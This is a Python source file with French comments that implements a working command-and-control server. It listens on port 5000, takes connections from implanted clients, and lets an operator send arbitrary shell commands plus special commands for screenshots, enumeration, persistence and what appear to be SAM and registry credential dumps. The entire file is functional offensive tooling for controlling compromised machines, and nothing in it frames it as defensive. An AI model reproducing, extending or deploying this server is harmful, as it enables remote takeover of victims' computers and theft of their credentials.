import socket
import threading
import json

# ==========================================
# 1. GESTION DES ERREURS
# ==========================================
def handle_error(error, context=""):
    print(f"[-] Erreur ({context}) : {type(error).__name__} - {error}")

# ==========================================
# 2. PROTOCOLE
# ==========================================
def encode_message(message: dict) -> bytes:
    try:
        return (json.dumps(message) + "\n").encode("utf-8")
    except Exception as e:
        raise ValueError(f"Erreur d'encodage : {e}")

def decode_message(data: bytes) -> dict:
    try:
        return json.loads(data.decode("utf-8").strip())
    except Exception as e:
        raise ValueError(f"Erreur de décodage : {e}")

# ==========================================
# 3. GESTION DU CLIENT
# ==========================================
def handle_client(client_socket, address):
    print(f"[+] Connexion acceptée depuis {address[0]}:{address[1]}")
    
    try:
        client_file = client_socket.makefile("rb")
        
        # Réception du "hello"
        line = client_file.readline()
        if not line:
            return
            
        message = decode_message(line)
        print(f"[INFO {address[0]}] {json.dumps(message, indent=2)}")
        
        # Boucle des commandes
        while True:
            cmd = input(f"C2 ({address[0]})> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
                
            # Détection des commandes spéciales
            if cmd in ("screenshot", "enum", "persist", "sam", "reg"):
                command_message = {"type": cmd}
            else:
                command_message = {"type": "command", "command": cmd}
            
            # Envoi
            client_socket.sendall(encode_message(command_message))
            
            # Réception du résultat
            result_line = client_file.readline()
            if not result_line:
                print("[-] Le client s'est déconnecté.")
                break
                
            result_message = decode_message(result_line)
            print(f"[RESULTAT]\n{result_message.get('result')}\n")
            
    except (OSError, ValueError) as error:
        handle_error(error, f"client {address[0]}")
    finally:
        print(f"[-] Session fermée avec {address[0]}")
        client_socket.close()

# ==========================================
# 4. SERVEUR PRINCIPAL
# ==========================================
def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 5000))
    server.listen(5)
    
    print("[*] Serveur C2 en écoute sur 0.0.0.0:5000...")
    
    try:
        while True:
            client_socket, address = server.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, address),
                daemon=True
            )
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\n[!] Arrêt du serveur.")
    finally:
        server.close()

if __name__ == "__main__":
    main()